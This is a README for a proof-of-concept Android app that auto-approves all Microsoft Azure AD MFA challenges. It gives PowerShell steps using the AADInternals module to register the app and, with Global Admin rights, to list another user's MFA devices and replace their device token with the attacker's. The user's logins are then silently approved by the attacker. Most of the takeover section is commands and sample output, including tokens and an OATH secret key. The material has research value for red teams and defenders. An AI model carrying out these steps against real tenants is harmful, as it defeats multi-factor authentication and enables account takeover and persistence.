# Disclaimer
Functionality provided through this app are not supported by Microsoft and thus should not be used in a production environment. Use on your own risk!
**NOTE:** This app **CAN NOT** be installed to device with **Microsoft Authenticator**.

# AADInternals Authenticator (Android App)
This is POC of a replacement authenticator for Microsoft Authenticator. This authenticator accepts all MFA authenticator challenges automatically.

Two ways to use:
1. Register an app for yourself (this can't be the first registered method so register SMS etc. beforehand at https://mysignins.microsoft.com)
2. Change user settings to use the app instead of their real Authenticator (requires Global Admin rights).

To use, you need the Device Token of your installed AADInternals Authenticator. You can then register the app or modify others' MFA settings using <a href="https://o365blog.com/aadinternals" target="_blank">AADInternals</a>. 

# Before you begin
There are a couple of steps you need to complete before continuing.

## Install AADInternals module (v0.4.0 or later)
First, install the <a href="https://o365blog.com/aadinternals" target="_blank">AADInternals</a> PowerShell module:
```
Install-Module AADInternals
```
Next, import the module:
```
Import-Module AADInternals
```
If you see the following, you good to go!
```
    ___    ___    ____  ____      __                        __    
   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ `/ / ___/
 / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  ) 
/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/  
  
 v0.4.0 by @NestoriSyynimaa
```

## Install the AADInternals Authenticator
Go to <a href="https://github.com/Gerenios/Authenticator/releases" target="_blank">Releases</a> and install the Authenticator to your Android device.

After installation, open the AADInternals Authenticator and click the button to get the Device Token. Should be something like:
```
APA91bEvVMWXcLy7EUEge4jSkD7HAAdWPn-0WjOHrkg0zZvVpg0LRBLa9QN7mEXyJSslqbkWx1Q5Qz8aZyJ69gs0rNGn-b5tc71P-XwRQ734AsdrDCvgJ5F9x17K6kfdisbFrT4z6xQE9EUxgMg5ZA8A-TVXepyqGQ
```
Copy the token to clipboard and send it to yourself via email etc.

# Registering the app for yourself
In PowerShell with AADInternals installed, set the token to a variable:
```
$DeviceToken = "APA91bEvVMWXcLy7EUEge4jSkD7HAAdWPn-0WjOHrkg0zZvVpg0LRBLa9QN7mEXyJSslqbkWx1Q5Qz8aZyJ69gs0rNGn-b5tc71P-XwRQ734AsdrDCvgJ5F9x17K6kfdisbFrT4z6xQE9EUxgMg5ZA8A-TVXepyqGQ"
```
Next, you need to get an Access Token for https://mysignins.microsoft.com:
```
$Token=Get-AADIntAccessTokenForMySignins
```
Now you can register the app:
```
Register-AADIntMFAApp -AccessToken $Token -DeviceToken $DeviceToken -DeviceName "My App"
```
You should have the output similar to below. Also the app should show two notifications, one for authentication activation and another one for authentication request. Check your devices at https://mysignins.microsoft.com to see your new app!
```
DefaultMethodOptions : 1
DefaultMethod        : 0
Username             : user@company.com
TenantId             : 9a79b12c-f563-4bdc-9d18-6e6d0d52f73b
AzureObjectId        : dce60ee2-d907-4478-9f36-de3d74708381
ConfirmationCode     : 1481770594613653
OathTokenSecretKey   : dzv5osvdx6dhtly4av2apcts32eqh4bg
OathTokenEnabled     : true
```

# Changing the authenticator for other users
In PowerShell with AADInternals installed, set the token to a variable:
```
$DeviceToken = "APA91bEvVMWXcLy7EUEge4jSkD7HAAdWPn-0WjOHrkg0zZvVpg0LRBLa9QN7mEXyJSslqbkWx1Q5Qz8aZyJ69gs0rNGn-b5tc71P-XwRQ734AsdrDCvgJ5F9x17K6kfdisbFrT4z6xQE9EUxgMg5ZA8A-TVXepyqGQ"
```
Next, you need to get an Access Token for Azure AD Graph API:
```
$Token=Get-AADIntAccessTokenForAADGraph
```
Now list the authentication apps of any user:
```
Get-AADIntUserMFAApps -AccessToken $Token -UserPrincipalName user@company.com
```
You should now have the list of user's authentication devices similar to below. Take a note of the **Id** of the device with **Notification** authentication type.
```
AuthenticationType : Notification, OTP
DeviceName         : SM-R2D2
DeviceTag          : SoftwareTokenActivated
DeviceToken        : APA91bGEK7k3iOM3n6cNZvrRvYHVXfRixhjZzXOXUKszB5AoBRQUccsmbSi4GRqWLesCz1_Y6IRicEme_LdKZIi0RbDFWSb9PFF57bSrU0Lu8g3wIHiIUystWo7WBhG0YYfgQGWUYwszANMEs78jMxetMyOEw33IgA
Id                 : 454b8d53-d97e-4ead-a69c-724166394334
NotificationType   : GCM
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : 6.2001.0140
TimeInterval       : 

AuthenticationType : OTP
DeviceName         : NO_DEVICE
DeviceTag          : SoftwareTokenActivated
DeviceToken        : NO_DEVICE_TOKEN
Id                 : aba89d77-0a69-43fa-9e5d-6f41c7b9bb16
NotificationType   : Invalid
OathTokenTimeDrift : 0
OathSecretKey      : 
PhoneAppVersion    : NO_PHONE_APP_VERSION
TimeInterval       : 
```
Now you can replace user's Device Token with yours (remember to back up the original):
```
Set-AADIntUserMFAApps -AccessToken $Token -Id 454b8d53-d97e-4ead-a69c-724166394334 -DeviceToken $DeviceToken
```
Next time the user tries to log in, your authenticator will automatically accept user's MFA challenge.
